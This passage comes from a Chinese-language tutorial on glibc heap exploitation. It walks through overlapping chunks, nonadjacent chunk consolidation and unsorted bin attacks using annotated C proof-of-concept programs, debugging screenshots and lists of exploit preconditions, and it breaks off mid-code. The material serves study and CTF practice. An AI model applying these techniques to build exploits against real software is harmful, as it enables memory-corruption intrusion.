chunk,并且将chunk1_ptr的size域标志位置0以伪造其被free的假象</p><p>然后程序free掉了chunk1触发了free的后向合并从而调用了unlink函数,此时我们的攻击就算结束了</p><p>而程序的攻击效果就是将本来是P处的指针变为了P-0x18的指针,我们就拥有了任意内存读写的能力,over~</p><p>这里我们列出一下我们利用所需要的的一些条件：</p><ol><li>两个相邻chunk，一个chunk存放伪造的chunk</li><li>伪造的chunk中fd=存放伪造chunk的地址-0x18，伪造的chunk中bk=存放伪造chunk的地址-0x10</li><li>下一个chunk的pre_inuse位为0，且pre_size要刚好到伪造的chunk，即要收缩chunk</li><li>释放那个没有包含伪造chunk的chunk</li></ol><h1 id="0x06-overlapping-chunks"><a href="#0x06-overlapping-chunks" class="headerlink" title="0x06 overlapping_chunks"></a>0x06 overlapping_chunks</h1><p>overlapping在平常是非常常用的技巧</p><h2 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="comment">// p2现在在unsorted bin中，时刻准备为新的malloc服务</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在模拟一下溢出来覆写p2的size</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 对实例程序而言,最后三个字节是什么并不重要,然而,我们最好还是维持一下堆的稳定性</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line"><span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line"><span class="comment">// 为了维持堆的稳定性，我门还是要把pre_inuse标志位设为1来确保我们的p1不会被错误的认为是一个free chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line"><span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line"> evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们分配一个和p2被注入的size一样的大小的chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 这次的malloc将会从我们刚刚修改过size的unsorted bin中取出free chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们写进p4的内容就可以覆盖p3啦，同时，我们写进p3里的内容也可以修改p4的内容</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line"><span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-4"><a href="#运行结果及调试-4" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>我们断在申请三个chunk p1，p2，p3后，看看此时的堆块</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510369556/0" alt="image-20210510195421233"></p><p>然后给三个chunk赋初值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510377494/0" alt="image-20210510195646045"></p><p>此时我们走到free掉p2，此时我们的p2被放进了unsorted bin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510382891/0" alt="image-20210510195820989"></p><p>接着我们假设我们溢出了chunk1，成功修改了chunk2的size为0x181</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510391587/0" alt="image-20210510200053341"></p><p>可以看到此时我们的chunk的size从0x101修改成了0x181，此时我们malloc p4将释放的chunk申请回来，此时p4就将整个p3都包含进去，在题目中我们可以切割p4，来将main_arena的地址放入到p3中，因为p3是没有释放的，我们可以利用p3来泄露地址等等。</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>程序先是malloc了2个0x100大小的chunk,p1,p2,和一个大小为0x80的chunk,p3</p><p>紧接着,程序初始化了三个chunk,里面的值分别为1,2,3</p><p>之后程序free掉了p2,并假设拥有溢出的能力,通过溢出p1修改了p2的size域</p><p>此时p2的size是0x181,系统会认为我们有一个大小为0x180的在unsorted bin中的fake chunk</p><p>紧接着,我们再申请了一个大小为0x180的chunk p4,这样系统就会把我们unsorted bin中的free chunk也就是我们构造好的大小为0x180的fake chunk拿出来给p4</p><p>此时p4的后0x80的空间就和p3共享了,这就构成了overlapping_chunk! 堆重叠</p><p>这里依旧列出我们利用所需要的一些条件：</p><ol><li>某个chunk的size被修改，通过溢出或者某种手段，将它后面的，也就是高地址的chunk包含进去，或者包含一部分</li><li>这个被修改size的chunk要先free掉，该了size之后，在申请回来，一般是先将它放到unsorted bin，其他bin都是有size检查的</li></ol><h1 id="0x07-overlapping-chunks-2"><a href="#0x07-overlapping-chunks-2" class="headerlink" title="0x07 overlapping_chunks_2"></a>0x07 overlapping_chunks_2</h1><h2 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个也被称为不相邻的free chunk conslidation 攻击</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// malloc_usable_size函数可以获取chunk实际分配的内存大小  </span></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 为了方便看攻击效果，所以5个chunk分别为A,B,C,D,E  </span></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 现在我们free一下p4，在有p5邻接top chunk的情况下，我们释放p4不会引起p4与top chunk合并</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在我们通过溢出chunk p1将chunk p2的size改为p2+p3的大小并且将标注为设为正在使用来触发漏洞 </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在我们再free p2，这个时候ptmalloc就会认为下一个chunk是p4(p2的size已经被我们改为p2+p3了)</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这样就会创建一个大的错误包含p3的free chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="comment">// 现在我们再创建一个新的大小正好是我们创建的fake free chunk的新chunk </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-5"><a href="#运行结果及调试-5" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是看下申请完所有chunk的堆块，malloc5个0x3e8大小的chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510640149/0" alt="image-20210510210804170"></p><p>此时我们free掉chunk4</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510705641/0" alt="image-20210510212807142"></p><p>此时我们修改chuk2的size域为0x7e1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510711611/0" alt="image-20210510213016267"></p><p>此时我们再申请p6</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510741490/0" alt="image-20210510213904156"></p><p>那么此时的p3已经包含再p6中了</p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>好了,程序首先malloc了5块大小为1008的chunk,p1,p2,p3,p4,p5</p><p>紧接着,程序free掉了p4,因为还有p5 紧邻着top chunk,因此p4并不会被合并到topchunk中</p><p><strong>这里要注意,在本例中,是否free p4的效果是一样的</strong></p><p>之后呢,为便于直观的看一下效果,将chunk按次序填满了A,B,C,D,E</p><p>紧接着,程序修改了chunk p2的size域大小为p2+p3,然后free掉了chunk p2</p><p>这个时候,系统会错误的把p2和p3合并的大chunk放进unsorted bin中并与我们的free chunk p4合并</p><p>然后申请了p2+p3大小的新chunk p6(所以我说其实不用free p4的…甚至都不用malloc p5 2333</p><p>此时p6的后半部分也就是p3大小的部分就与之前未free的p3重叠了:)</p><p>这里也做一下overlapping_chunks和overlapping_chunks_2的比较</p><p>overlapping_chunks中,程序更改了已经释放掉的chunk的size域而2则是修改了还未释放的chunk的size域,但是效果都是一样的,都是构造了一个重叠块 (overlapping chunk!</p><h1 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h1><p>unsorted bin attack的杀伤力虽然不够，但是也是不可小视的辅助攻击方式</p><p>在_int_malloc中有这么一段，他会在unsorted bin取出时被调用：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>这个bck是什么呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim -&gt; bk</span><br></pre></td></tr></table></figure><p>因此我们只需要控制bk指针就可以让bck位置可控，而我们的bck-fd也就可控的，此时就可以往任意地址写一个东西，但是写的东西归我们控制，因此只能打辅助</p><h2 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h2><p>本demo使用unsorted bin attack技巧将一个很大的无符号long型值写进了栈里</p><p>在实际中,unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// stack_var就是我们的攻击目标</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="comment">// 我们先在堆上分配一个正常的chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">    <span class="comment">// 现在我们释放的p将会被放入unsorted bin中，并且其bk指向p[1]</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="comment">// 现在我们模拟有一个漏洞让我们可以覆写victim-bk指针</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="comment">// 现在我们再分配一次来取回我们刚刚free掉的chunk，此时攻击目标已经被改写了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-6"><a href="#运行结果及调试-6" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是先看下分配完的堆块结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513335246/0" alt="image-20210511162319659"></p><p>然后将我们的p放入unsorted bin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513338605/0" alt="image-20210511162411174"></p><p>然后给我们的p[1]赋值，也就是给我们p的bk赋值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513343261/0" alt="image-20210511162515662"></p><p>可以看到我们的bk指针已经被修改为了&amp;stack_var-2，此时取出我们的unsorted bin中的chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513355599/0" alt="image-20210511162741872"></p><p>可以看到此时我们的stack_var已经写成了unsortedbin(av)的值，其实就是把bk处也就是<code>0x7fffffffde08</code>当成chunk，并在它的bk位置写入一个值。</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>程序首先定义了一个变量stack_var,紧接着malloc了两个chunk</p><p>之后Free掉了第一块chunk,并修改p-&gt;bk=&amp;stack_var,这个时候再malloc出来</p><p>然后我们的变量值就被改成了unsorted bin(av)的地址</p><p>在正常使用中,因为unsorted bin写入的值并非可控值,因此只是起到一个辅助的作用</p><p>依旧是列条件：</p><ol><li>首先是在unsorted bin中放入一个chunk，修改这个chunk的bk为 想要写值的地址-0x10</li><li>然后把这个unsorted bin申请回来</li></ol><h1 id="0x08-unsorted-bin-into-stack"><a href="#0x08-unsorted-bin-into-stack" class="headerlink" title="0x08 unsorted bin into stack"></a>0x08 unsorted bin into stack</h1><p>这个就是通过unsorted bin里的chunk的bk来达到在将chunk申请到栈上的效果</p><h2 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在栈上伪造一个chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the 